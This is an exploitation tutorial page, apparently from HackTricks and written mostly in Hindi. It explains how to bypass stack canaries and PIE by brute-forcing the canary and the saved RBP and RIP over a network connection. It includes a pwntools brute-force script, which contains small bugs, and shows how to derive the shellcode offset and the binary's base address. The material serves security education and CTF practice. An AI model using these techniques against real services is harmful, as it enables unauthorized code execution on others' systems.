# BF Addresses in the Stack

{{#include ../../../banners/hacktricks-training.md}}

**यदि आप एक बाइनरी का सामना कर रहे हैं जो एक कैनरी और PIE (पोजीशन इंडिपेंडेंट एक्सीक्यूटेबल) द्वारा सुरक्षित है, तो आपको शायद उन्हें बायपास करने का एक तरीका खोजने की आवश्यकता है।**

![](<../../../images/image (865).png>)

> [!NOTE]
> ध्यान दें कि **`checksec`** यह नहीं पता लगा सकता है कि एक बाइनरी कैनरी द्वारा सुरक्षित है यदि इसे स्थिर रूप से संकलित किया गया था और यह फ़ंक्शन की पहचान करने में सक्षम नहीं है।\
> हालाँकि, आप इसे मैन्युअल रूप से देख सकते हैं यदि आप पाते हैं कि एक मान फ़ंक्शन कॉल की शुरुआत में स्टैक में सहेजा गया है और यह मान बाहर निकलने से पहले जांचा जाता है।

## Brute-Force Addresses

**PIE को बायपास करने के लिए** आपको **कुछ पते लीक करने** की आवश्यकता है। और यदि बाइनरी कोई पते लीक नहीं कर रही है, तो इसे करने का सबसे अच्छा तरीका है **कमजोर फ़ंक्शन में स्टैक में सहेजे गए RBP और RIP को ब्रूट-फोर्स करना।**\
उदाहरण के लिए, यदि एक बाइनरी को **कैनरी** और **PIE** दोनों का उपयोग करके सुरक्षित किया गया है, तो आप कैनरी को ब्रूट-फोर्स करना शुरू कर सकते हैं, फिर **अगले** 8 बाइट्स (x64) सहेजे गए **RBP** होंगे और **अगले** 8 बाइट्स सहेजे गए **RIP** होंगे।

> [!TIP]
> यह माना जाता है कि स्टैक के अंदर लौटने वाला पता मुख्य बाइनरी कोड से संबंधित है, जो, यदि कमजोर बिंदु बाइनरी कोड में स्थित है, तो आमतौर पर ऐसा ही होगा।

बाइनरी से RBP और RIP को ब्रूट-फोर्स करने के लिए, आप यह पता लगा सकते हैं कि एक मान्य अनुमानित बाइट सही है यदि प्रोग्राम कुछ आउटपुट करता है या यह बस क्रैश नहीं होता है। **कैनरी को ब्रूट-फोर्स करने के लिए प्रदान की गई** वही फ़ंक्शन RBP और RIP को ब्रूट-फोर्स करने के लिए उपयोग की जा सकती है:
```python
from pwn import *

def connect():
r = remote("localhost", 8788)

def get_bf(base):
canary = ""
guess = 0x0
base += canary

while len(canary) < 8:
while guess != 0xff:
r = connect()

r.recvuntil("Username: ")
r.send(base + chr(guess))

if "SOME OUTPUT" in r.clean():
print "Guessed correct byte:", format(guess, '02x')
canary += chr(guess)
base += chr(guess)
guess = 0x0
r.close()
break
else:
guess += 1
r.close()

print "FOUND:\\x" + '\\x'.join("{:02x}".format(ord(c)) for c in canary)
return base

# CANARY BF HERE
canary_offset = 1176
base = "A" * canary_offset
print("Brute-Forcing canary")
base_canary = get_bf(base) #Get yunk data + canary
CANARY = u64(base_can[len(base_canary)-8:]) #Get the canary

# PIE BF FROM HERE
print("Brute-Forcing RBP")
base_canary_rbp = get_bf(base_canary)
RBP = u64(base_canary_rbp[len(base_canary_rbp)-8:])
print("Brute-Forcing RIP")
base_canary_rbp_rip = get_bf(base_canary_rbp)
RIP = u64(base_canary_rbp_rip[len(base_canary_rbp_rip)-8:])
```
आपको PIE को हराने के लिए अंतिम चीज़ **लीक किए गए** पते से **उपयोगी पते** की गणना करना है: **RBP** और **RIP**।

**RBP** से आप यह गणना कर सकते हैं कि **आप स्टैक में अपना शेल कहाँ लिख रहे हैं**। यह जानना बहुत उपयोगी हो सकता है कि आप स्टैक के अंदर स्ट्रिंग _"/bin/sh\x00"_ कहाँ लिखने जा रहे हैं। लीक किए गए RBP और आपके शेलकोड के बीच की दूरी की गणना करने के लिए, आप बस **RBP लीक करने के बाद एक ब्रेकपॉइंट डाल सकते हैं** और चेक कर सकते हैं **आपका शेलकोड कहाँ स्थित है**, फिर, आप शेलकोड और RBP के बीच की दूरी की गणना कर सकते हैं:
```python
INI_SHELLCODE = RBP - 1152
```
**RIP** से आप **PIE बाइनरी का बेस एड्रेस** निकाल सकते हैं, जो आपको **मान्य ROP चेन** बनाने के लिए चाहिए होगा।\
बेस एड्रेस निकालने के लिए बस `objdump -d vunbinary` करें और नवीनतम पतों को असेंबल करें:

![](<../../../images/image (479).png>)

उस उदाहरण में आप देख सकते हैं कि सभी कोड को स्थानांतरित करने के लिए केवल **1 बाइट और आधा** आवश्यक है, फिर, इस स्थिति में बेस एड्रेस **लीक किए गए RIP पर "000" के साथ समाप्त होगा**। उदाहरण के लिए, यदि आपने `0x562002970ecf` लीक किया, तो बेस एड्रेस `0x562002970000` है।
```python
elf.address = RIP - (RIP & 0xfff)
```
## सुधार

[**इस पोस्ट से कुछ अवलोकनों के अनुसार**](https://github.com/florianhofhammer/stack-buffer-overflow-internship/blob/master/NOTES.md#extended-brute-force-leaking), यह संभव है कि जब RBP और RIP मानों को लीक किया जा रहा हो, तो कुछ मानों के साथ सर्वर क्रैश नहीं होगा जो सही नहीं हैं और BF स्क्रिप्ट सोच सकती है कि उसे अच्छे मान मिल गए हैं। इसका कारण यह है कि **कुछ पते बस इसे नहीं तोड़ेंगे भले ही वे बिल्कुल सही न हों**।

उस ब्लॉग पोस्ट के अनुसार, सर्वर के लिए अनुरोधों के बीच एक छोटा विलंब जोड़ने की सिफारिश की गई है।

{{#include ../../../banners/hacktricks-training.md}}
